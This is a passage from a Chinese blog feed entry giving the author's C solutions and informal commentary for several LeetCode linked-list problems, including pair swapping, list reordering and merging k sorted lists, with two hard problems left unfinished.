<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(len1--,len2--;len2&gt;=<span class="number">0</span>;len1--,len2--)</span><br><span class="line">    &#123;</span><br><span class="line">        retn-&gt;val = (n1[len1] + n2[len2] + flag) % <span class="number">10</span>;</span><br><span class="line">        flag = (n1[len1] + n2[len2] + flag) / <span class="number">10</span>;</span><br><span class="line">        tmp = retn;</span><br><span class="line">        retn = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        retn-&gt;next = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len1!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        retn-&gt;val = (n1[len1] + flag) % <span class="number">10</span>;</span><br><span class="line">        flag = (n1[len1] + flag) / <span class="number">10</span>;</span><br><span class="line">        tmp = retn;</span><br><span class="line">        retn = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        retn-&gt;next = tmp;</span><br><span class="line">        len1--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)</span><br><span class="line">    &#123;</span><br><span class="line">        retn-&gt;val = flag;</span><br><span class="line">        <span class="keyword">return</span> retn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，因为需要额外的栈空间，所以空间复杂度上不是很理想（<del>分明是退阶解法</del></p><p><img src="https://s1.ax1x.com/2020/09/23/wx8bp6.png" alt="wx8bp6.png"></p><h2 id="0x09-两两交换链表中的节点"><a href="#0x09-两两交换链表中的节点" class="headerlink" title="0x09. 两两交换链表中的节点"></a>0x09.<a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/" target="_blank" rel="noopener"> 两两交换链表中的节点</a></h2><blockquote><p>给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。</p><p>你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</p><p>示例:</p><p>给定 1-&gt;2-&gt;3-&gt;4, 你应该返回 2-&gt;1-&gt;4-&gt;3.</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs" target="_blank" rel="noopener">https://leetcode-cn.com/problems/swap-nodes-in-pairs</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>很简单的一个交换结点的题，两两交换即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">swapPairs</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span>, *<span class="title">temp2</span> = <span class="title">head</span>-&gt;<span class="title">next</span>-&gt;<span class="title">next</span>, *<span class="title">temp3</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>)), *<span class="title">retn</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">    temp3-&gt;next = head;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!head-&gt;next)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        temp2 = head-&gt;next-&gt;next;</span><br><span class="line">        temp = head-&gt;next;</span><br><span class="line">        temp3-&gt;next = temp;</span><br><span class="line">        temp-&gt;next = head;</span><br><span class="line">        head-&gt;next = temp2;</span><br><span class="line">        temp3 = head;</span><br><span class="line">        head = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wxsgOA.png" alt="wxsgOA.png"></p><h2 id="0x0A-重排链表"><a href="#0x0A-重排链表" class="headerlink" title="0x0A.重排链表"></a>0x0A.<a href="https://leetcode-cn.com/problems/reorder-list/" target="_blank" rel="noopener">重排链表</a></h2><blockquote><p>给定一个单链表 L：L0→L1→…→Ln-1→Ln ，<br>将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→…</p><p>你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</p><p>示例 1:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3.<br>示例 2:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3.</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/reorder-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reorder-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：快慢指针-2"><a href="#解法：快慢指针-2" class="headerlink" title="解法：快慢指针"></a>解法：快慢指针</h3><p>两个步长分别为1与2的指针对链表进行遍历，当快指针走到NULL时慢指针刚好走到链表中部</p><p>从链表中部断开，逆序重构后半段链表</p><p>两段链表合并即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reorderList</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">fast</span> = <span class="title">head</span>-&gt;<span class="title">next</span>-&gt;<span class="title">next</span>, * <span class="title">slow</span> = <span class="title">head</span>, *<span class="title">temp</span> = <span class="title">NULL</span>, *<span class="title">temp2</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(fast)</span><br><span class="line">    &#123;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!fast)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp2 = slow-&gt;next;</span><br><span class="line">    slow-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    slow = temp2;</span><br><span class="line">    <span class="keyword">while</span>(slow)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = slow-&gt;next;</span><br><span class="line">        slow-&gt;next = temp;</span><br><span class="line">        temp = slow;</span><br><span class="line">        slow = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    slow = temp;</span><br><span class="line">    temp = head;</span><br><span class="line">    <span class="keyword">while</span>(temp &amp;&amp; slow)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = temp-&gt;next;</span><br><span class="line">        temp-&gt;next = slow;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        temp-&gt;next-&gt;next = temp2;</span><br><span class="line">        temp = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wxy6hT.png" alt="wxy6hT.png"></p><h1 id="0x03-难度：困难"><a href="#0x03-难度：困难" class="headerlink" title="0x03.难度：困难"></a>0x03.难度：困难</h1><h2 id="0x00-合并K个排序链表"><a href="#0x00-合并K个排序链表" class="headerlink" title="0x00.合并K个排序链表"></a>0x00.<a href="https://leetcode-cn.com/problems/merge-k-sorted-lists/" target="_blank" rel="noopener">合并K个排序链表</a></h2><blockquote><p>合并 k 个排序链表，返回合并后的排序链表。请分析和描述算法的复杂度。</p><p>示例:</p><blockquote><p>输入:<br>[<br>  1-&gt;4-&gt;5,<br>  1-&gt;3-&gt;4,<br>  2-&gt;6<br>]<br>输出: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</p></blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/merge-k-sorted-lists" target="_blank" rel="noopener">https://leetcode-cn.com/problems/merge-k-sorted-lists</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>Leetcode链表题当中唯二的两道难度为<strong>困难</strong>的题之一，看起来似乎并不难的样子，似乎<strong>只需要多次遍历拼接得到一个新的链表就好了</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">mergeKLists</span><span class="params">(struct ListNode** lists, <span class="keyword">int</span> listsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(listsSize == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(listsSize == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> lists[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//以上为处理特殊情况</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">head</span> = <span class="title">NULL</span>, *<span class="title">temp</span>;</span><span class="comment">//要返回的新链表的头和遍历变量</span></span><br><span class="line">    <span class="keyword">int</span> pd;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;listsSize;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">min</span> = <span class="number">9999999</span>;</span><br><span class="line">        pd = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;listsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(lists[j]!=<span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(lists[j]-&gt;val&lt;=<span class="built_in">min</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">min</span>=lists[j]-&gt;val;</span><br><span class="line">                    pd = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pd == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> head;<span class="comment">//都空了的情况</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span>)<span class="comment">//单独处理头</span></span><br><span class="line">        &#123;</span><br><span class="line">            head = temp = lists[pd];</span><br><span class="line">            lists[pd] = lists[pd]-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            temp-&gt;next = lists[pd];</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">            lists[pd] = lists[pd]-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(lists[pd] == <span class="literal">NULL</span>)</span><br><span class="line">            i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/23/qjZp7UKiat9hPBG.png" alt="QQ截图20200423104733.png"></p><p>毫无疑问，这个拍脑门想出来的算法的时间复杂度极高XD</p><p>那么我们应该如何进行优化呢？</p><blockquote><p>咕了，后面再补</p></blockquote><h2 id="0x01-K-个一组翻转链表"><a href="#0x01-K-个一组翻转链表" class="headerlink" title="0x01.K 个一组翻转链表"></a>0x01.<a href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group/" target="_blank" rel="noopener">K 个一组翻转链表</a></h2><blockquote><p>给你一个链表，每 k 个节点一组进行翻转，请你返回翻转后的链表。</p><p>k 是一个正整数，它的值小于或等于链表的长度。</p><p>如果节点总数不是 k 的整数倍，那么请将最后剩余的节点保持原有顺序。</p><p>示例：</p><p>给你这个链表：<code>1-&gt;2-&gt;3-&gt;4-&gt;5</code></p><p>当 k = 2 时，应当返回:<code>2-&gt;1-&gt;4-&gt;3-&gt;5</code></p><p>当 k = 3 时，应当返回: <code>3-&gt;2-&gt;1-&gt;4-&gt;5</code></p><p>说明：</p><p>你的算法只能使用常数的额外空间。<br><strong>你不能只是单纯的改变节点内部的值，而是需要实际进行节点交换</strong>。</p><blockquote><p>PS：指不能偷懒吗XDDD</p></blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reverse-nodes-in-k-group</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>Leetcode链表题当中唯二的两道难度为<strong>困难</strong>的题之二，确实挺有分量</p><p>但是既然我们都做了那么多道链表反转了，那么这题其实我们是可以使用类似的思路的XD</p><blockquote><p>鸽了，下次再写</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;leetcode上面的链表题很有意思，最近做到我废寝忘食都写不出来，所以推荐大家都去写一写（逃&lt;/p&gt;
&lt;p&gt;说实话双向链表比单向链表方便的太多了（笑），&lt;del&gt;这点空间复杂度不算什么，建议大家都去写双向链表（不）&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;不过其实相对于空间复杂度，我更看重时间复杂度，空间复杂度再高一般也不容易爆，然而时间复杂度稍微高一点点往往就容易TLE…（来自OI狗的怨念）&lt;/p&gt;
&lt;p&gt;顺便作为大括号换行党吐槽一下Leetcode的不换行机制😡&lt;/p&gt;
&lt;p&gt;注：因为题是写不完的，所以这篇文章会不定期的进行更新www&lt;/p&gt;
&lt;p&gt;最后一次更新日期为：2020.10.9（终于等来的更新？&lt;/p&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="题解" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="Python" scheme="http://archive.next.arttnba3.cn/tags/Python/"/>
    
    <category term="链表" scheme="http://archive.next.arttnba3.cn/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="树" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%91/"/>
    
    <category term="二叉树" scheme="http://archive.next.arttnba3.cn/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
    <category term="深度优先搜索（DFS）" scheme="http://archive.next.arttnba3.cn/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88DFS%EF%BC%89/"/>
    
    <category term="递归" scheme="http://archive.next.arttnba3.cn/tags/%E9%80%92%E5%BD%92/"/>
    
    <category term="双指针" scheme="http://archive.next.arttnba3.cn/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
</feed>
